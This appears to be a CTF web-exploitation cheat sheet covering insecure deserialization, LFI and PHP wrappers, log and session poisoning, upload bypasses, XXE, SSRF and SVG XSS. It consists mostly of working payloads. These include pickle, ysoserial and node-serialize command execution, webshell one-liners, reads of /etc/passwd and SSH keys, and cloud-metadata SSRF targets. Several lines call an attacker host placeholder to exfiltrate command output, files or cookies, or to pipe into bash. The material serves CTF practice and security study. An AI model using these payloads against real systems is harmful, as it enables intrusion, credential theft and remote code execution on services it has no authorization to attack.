# Deserialization, file bugs, XXE, SSRF

Remote testing gated (router `ctf`). Craft payloads locally; verify against local
mirrors (`php -S`, `.venv/bin/python`, `podman`) before touching the target.

## 1. Deserialization by language

### PHP — `unserialize()`

Serialized objects: `O:8:"ClassName":2:{s:3:"foo";s:3:"bar";s:3:"num";i:5;}`.
Signature strings: `O:` (object), `a:` (array), `s:` (string), `i:` (int) in cookies,
hidden fields, base64 blobs.

Attack flow: find magic methods in source — `__destruct`, `__wakeup`, `__toString`,
`__call`, `__get`, `__invoke` — then build a POP chain (set properties so a later
method call reaches a sink: `system`, `include`, `eval`, `file_get_contents`).

```text
# edit property counts when crafting: O:4:"User":1:{...} with 2 properties inside = parse error
# __wakeup bypass (CVE-2016-7124): declare MORE properties than the class has —
# PHP 5 < 5.6.25 and PHP 7 < 7.0.10 skip __wakeup
```

phar:// — `unserialize` not even needed: any filesystem call on a `phar://` URL
(`file_exists`, `file_get_contents`, `fopen`, `getimagesize`...) unserializes the
phar's metadata:

```php
// gen.php — craft: php -d phar.readonly=0 gen.php  (php: sudo pacman -S php)
<?php
$phar = new Phar('up.phar');
$phar->startBuffering();
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');   // polyglot: magic prefix + real stub
$phar->setMetadata(new UserClass(...));                // the POP chain object
$phar->addFromString('a.txt', 'x');
$phar->stopBuffering();
```

Upload as `up.gif` (content-type sniffing passes on GIF89a), trigger
`file_exists('phar://uploads/up.gif/a.txt')`.

Leveraged gadget libraries: Laravel (`phpggc` — `git clone https://github.com/ambionics/phpggc`
then `./phpggc Laravel/RCE1 system id -b`); a leaked `APP_KEY` (base64 from `.env`)
decrypts cookies → CVE-2018-15133 style unauthenticated deserialization with
phpggc's `Laravel/RCE*` gadgets. Needs php + composer for full builds.

### Python — `pickle`

Sink: `pickle.loads(user_bytes)` (also `pickle.load`, `cPickle`, `joblib.load`,
`dill`, `shelve`). Payload + delivery:

```python
import base64, pickle
class P:
    def __reduce__(self):
        import os
        return (os.system, ("curl http://YOU/?p=$(id)",))
print(base64.b64encode(pickle.dumps(P())).decode())
```

`__reduce__` returning `(eval, ("__import__('os').popen('id').read()",))` captures
output when the return value is echoed.

### Java

Detection: raw bytes start `AC ED 00 05` (hex), base64 starts `rO0AB`; content-type
`application/x-java-serialized-object`; any `ObjectInputStream.readObject` in source.

```bash
git clone https://github.com/frohoff/ysoserial && cd ysoserial && mvn -q package -DskipTests
# detection gadget — DNS/HTTP callback with zero library deps:
java -jar ysoserial.jar URLDNS 'http://YOU.oast.example/' > dns.bin
# RCE gadgets (pick by libs on the classpath; CC=CommonsCollections, CB=CommonsBeanutils...):
java -jar ysoserial.jar CommonsCollections6 'curl http://YOU/' > p.bin
java -jar ysoserial.jar CommonsBeanutils1 'bash -c {echo,curl http://YOU/}|{base64,-d}|{bash,-i}' > p.bin
```

`Runtime.exec` output is invisible — exfil via curl/DNS/file, or use gadgets that
load remote classes (JRMPClient + a listener). Many modern apps block classic
gadgets: enumerate the classpath (Spring, Hibernate, Jackson polymorphic typing)
and match gadgets to actual versions.

### Ruby — `Marshal.load`

Blob starts `\x04\x08` (hex `0408`). No public toolchain as complete as ysoserial;
chain `Gem::Installer`/`Gem::SpecFetcher` gadgets (available whenever RubyGems is
loaded, i.e. nearly always) — see published Rails Marshal RCE writeups for the
exact 2-3 object chains. ERB injection is simpler when present: template input to
`ERB.new(x).result` executes Ruby: `<%= %x(id) %>`.

### YAML

```yaml
# PyYAML, yaml.load without SafeLoader (any version):
!!python/object/apply:os.system ["curl http://YOU/"]
!!python/object/new:os.system ["id"]
# PyYAML >= 5.1 yaml.load defaults warn/FullLoader; FullLoader still allows some
# !!python/object forms — only yaml.safe_load is actually safe.
```

Ruby YAML (`YAML.load`, Rails < 5.2 default): the `Gem:*` / `ERB` gadget chain again.
Node `js-yaml`: `!!js/function` executes only with non-default schema
(`schema: js-yaml.FULL_SCHEMA` passed to load) — check the call site.

### Node — `node-serialize`

Sink: `node-serialize`'s `unserialize()` on user JSON. The `IIFE trick` executes on
deserialize without any method call:

```json
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('curl http://YOU/', function(){});}()"}
```

Watch also for `funcster`, `serialize-to-js`, and `JSON.parse` of `__proto__` keys
(see `references/client.md` prototype pollution).

## 2. LFI / RFI

```bash
# path list, in order of value:
index.php?file=../../../../etc/passwd
index.php?file=../../../../etc/passwd%00          # PHP < 5.3.4 null-byte truncation
index.php?file=/etc/passwd                        # absolute (no normalization)
index.php?file=....//....//etc/passwd             # naive str_replace('../','') filters
index.php?file=/proc/self/environ                 # env vars; your UA header may land here
index.php?file=/proc/self/cmdline                 # how the server was started (args, keys)
index.php?file=/proc/self/cwd/index.php           # relative to the server's cwd
index.php?file=/var/log/apache2/access.log        # see log poisoning
index.php?file=/var/log/nginx/access.log
index.php?file=/tmp/sess_<PHPSESSID>              # see session inclusion
index.php?file=/var/lib/php/sessions/sess_<PHPSESSID>
index.php?file=../../home/user/.ssh/id_rsa
```

PHP wrappers:

```text
php://filter/convert.base64-encode/resource=index.php   # read source as base64
php://filter/read=convert.base64-encode/resource=/etc/passwd
data://text/plain,<?php system('id');?>    # requires allow_url_include=On
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
expect://id                                # requires expect extension
zip:///tmp/up.zip%23shell.php              # zip wrapper, %23 = '#'
phar:///tmp/up.phar/shell.php              # see phar above
```

Note: `include 'php://input'` + POST body works when `allow_url_include=On`;
`php://filter` needs neither allow_* setting — use it for source reads always.

### php://filter chain → RCE (oracle attack)

When only `include` of local paths exists and LFI can read source but not execute
user content: craft a chain of iconv conversions where PHP emits a conversion
error/warning whose message contains one attacker-chosen byte of output. Stacking
~hundreds of filters yields arbitrary content written into the include'd stream =
PHP code. Automate:

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
scripts/ctf python php_filter_chain_generator/php_filter_chain_generator.py \
    --chain '<?= system($_GET[0]); ?>'
# paste the resulting php://filter/... URL into the LFI param, add &0=id
```

Conceptual oracle: each filter stage either passes bytes through or produces a
deprecation/warning that embeds the next planned byte; the final error text is the
payload. Needs iconv (bundled) and a response surface where warnings appear.

### Log poisoning

```bash
# 1. poison the access log via any logged field:
curl -s "$base/" -A '<?php system($_GET[0]); ?>'
curl -s "$base/<?php system($_GET[0]); ?>"        # the URL itself gets logged
# 2. include the log:
curl -s "$base/index.php?file=/var/log/apache2/access.log&0=id"
```

Nginx: `/var/log/nginx/access.log`; also try `/proc/self/fd/2` (stderr) and
`/var/log/mail.log` when the box also runs SMTP. PHP-FPM pools can restrict log
reads — source review first.

### Session file inclusion

```bash
# 1. put PHP into a session-stored field (username, profile note):
curl -s -c jar "$base/login" -d 'user=<?php system($_GET[0]); ?>&pass=x'
# 2. include the session file:
curl -s -b jar "$base/index.php?file=/tmp/sess_<SESSID>&0=id"
```

### File upload bypasses

| Control | Bypass |
|---|---|
| Extension blacklist | `.php5 .phtml .phar .pht .php.gif`, case `.PhP`, trailing dot/space (`shell.php.`, `shell.php `), `.php.jpg` double with parser quirks, `.htaccess` first then any-named file |
| Extension whitelist | null byte `shell.php%00.jpg` (PHP < 5.3.4), double `shell.jpg.php`, `.user.ini` (php-fpm: `auto_prepend_file=shell.gif`) |
| Content check (`getimagesize`) | polyglot: `printf 'GIF89a' | cat - shell.php > shell.gif` |
| Magic bytes | real image header + PHP appended; images pass, include still executes the PHP tail via LFI |
| Directory traversal in filename | `filename=../../../../var/www/html/shell.php` |
| `.htaccess` upload (Apache, AllowOverride on) | `AddType application/x-httpd-php .txt` then upload `x.txt` |
| zip upload + LFI | `zip://...%23shell.php` |
| phar upload + file op | phar:// above |

### Race on file cleanup

Apps that save, check, then delete: hit the window between save and unlink by
uploading in a loop while requesting the execution path (LFI include, image
processing, preview renderer) in a parallel loop. Also try: upload same name twice,
TOCTOU on rename, and keeping a handle via zip/phar wrappers.

## 3. XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<r>&xxe;</r>
```

```xml
<!-- blind/OOB: remote DTD so entities resolve on the attacker side -->
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % remote SYSTEM "http://YOU/ev.xml"> %remote; ]>
<r>x</r>
<!-- ev.xml on your server: -->
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOU/?d=%file;'>">
%eval; %exfil;
```

```text
SSRF via XXE:  SYSTEM "http://internal-host:6379/"       (error/side channel)
RCE via XXE:   SYSTEM "expect://id"                      (PHP + expect ext)
```

Sinks: file upload previews (docx/xlsx/svg are ZIPs of XML — edit, rezip), SOAP
endpoints, SAML parsers, `simplexml_load_string`, `DOMDocument->load`, lxml with
`resolve_entities`. PHP needs `LIBXML_NOENT` passed to the load call for external
entity substitution (off by default since libxml2 2.9); python lxml 5.x (libxml2
2.12+) blocks external entities unless explicitly enabled.

## 4. SSRF

Sink: server fetches a URL you control (webhooks, importers, "paste a link",
image-from-URL, PDF generators).

```bash
# internal port scan — use the app's own responses (timing, size, error diff):
for p in 80 443 3000 5000 6379 8000 8080 8081 9200 11211 27017 3306 5432; do
  curl -s -m 4 -o /dev/null -w "$p %{http_code} %{time_total}s\n" \
       "$base/fetch?url=http://127.0.0.1:$p/"
done

# cloud metadata:
http://169.254.169.254/latest/meta-data/                       # AWS IMDSv1
# IMDSv2 needs a token first: PUT /latest/api/token  header X-aws-ec2-metadata-token-ttl-seconds: 21600
#   then send the token header X-aws-ec2-metadata-token: <token>
http://metadata.google.internal/computeMetadata/v1/            # GCP, needs header Metadata-Flavor: Google
http://169.254.169.254/openstack/latest/meta_data.json         # OpenStack
```

Filter bypasses: `http://0x7f000001/`, `http://0177.0.0.1/`, DNS name resolving to
127.0.0.1 (`localtest.me`, `nip.io` — `127.0.0.1.nip.io`), redirects (fetch
allowlist checks the first hop only), `@` userinfo (`http://allowed.com@127.0.0.1/`).

gopher:// — talk raw to inner services through the SSRF (Redis/MySQL/SMTP/FastCGI):

```bash
git clone https://github.com/tarunkant/Gopherus
scripts/ctf python Gopherus/gopherus.py --exploit redis     # interactive payload builder
# result: gopher://127.0.0.1:6379/_<urlencoded RESP commands>
```

DNS rebinding: when the app resolves your domain once for validation and again for
the fetch, a rebinding name (e.g. `<ip1>.<ip2>.rbndr.us`) returns the allowlisted IP
first and 127.0.0.1 second. Note the double-resolve requirement; test with short TTLs.

## 5. SVG upload → XSS

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script>fetch('http://YOU/?c='+document.cookie)</script>
</svg>
```

Upload as profile picture/avatar; when anyone (admin bot) navigates to the raw
image URL, scripts execute (SVG is XML+JS). Combine with CSP bypasses in
`references/client.md`. If the app serves uploads inline (Content-Type image/svg+xml
without Content-Disposition or a sandbox/Content-Security-Policy), it is game over.
